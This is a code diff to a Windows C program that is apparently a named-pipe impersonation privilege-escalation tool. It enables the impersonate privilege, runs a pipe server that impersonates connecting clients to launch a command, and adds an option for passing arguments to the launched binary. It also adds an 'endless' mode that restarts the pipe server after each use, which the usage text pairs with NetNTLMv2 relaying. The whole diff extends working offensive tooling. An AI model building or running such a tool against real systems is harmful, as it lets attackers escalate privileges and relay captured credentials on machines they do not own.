@@ -7,8 +7,10 @@
 
 //global variables
 wchar_t* commandline = NULL;
+wchar_t* arguments = NULL;
 wchar_t* clsid_string;
 char gPipeName[MAX_PATH];
+bool endless = false;
 wchar_t WinStationName[256];
 
 //functions
@@ -37,6 +39,18 @@ int wmain(int argc, wchar_t** argv)
 			++argv;
 			--argc;
 			pipe_placeholder = argv[1];
+			break;
+
+		case 'a':
+			++argv;
+			--argc;
+			arguments = argv[1];
+			break;
+
+		case 'n':
+			++argv;
+			--argc;
+			endless = true;
 			break;
 
 		case 'z':
@@ -68,11 +82,11 @@ int wmain(int argc, wchar_t** argv)
 	
 	
 	printf("[+] Starting Pipeserver...\n");
-	PipeServerImpersonate(commandline, pipe_placeholder);
+	PipeServerImpersonate(commandline, pipe_placeholder, arguments);
 	return 0;
 }
 
-void PipeServerImpersonate(wchar_t *commandline, wchar_t *pipe_placeholder) {
+void PipeServerImpersonate(wchar_t *commandline, wchar_t *pipe_placeholder, wchar_t* arguments) {
 	DWORD threadId;
 	wchar_t pipename[MAX_PATH];
 	if (!EnablePriv(NULL, SE_IMPERSONATE_NAME))
@@ -90,7 +104,7 @@ void PipeServerImpersonate(wchar_t *commandline, wchar_t *pipe_placeholder) {
 		wcstombs(gPipeName, pipe_placeholder, MAX_PATH-1);
 	
 	wsprintf(pipename, L"\\\\.\\pipe\\%S", gPipeName);
-	CreatePipeServer(pipename);	
+	CreatePipeServer(pipename, endless);	
 }
 
 void Usage()
@@ -105,6 +119,8 @@ void Usage()
 	printf("Optional args: \n"
 		"-p pipename_placeholder: placeholder to be used in the pipe name creation (default: PipeServerImpersonate)\n"
 		"-z : this flag will randomize the pipename_placeholder (don't use with -p)\n"
+		"-a : arguments to run the binary with\n"
+		"-n : endless mode - restart the Named Pipe Server after execution - can be used in combination with NetNTLMv2 relaying.\n"
 	);
 
 	printf("\n\n");
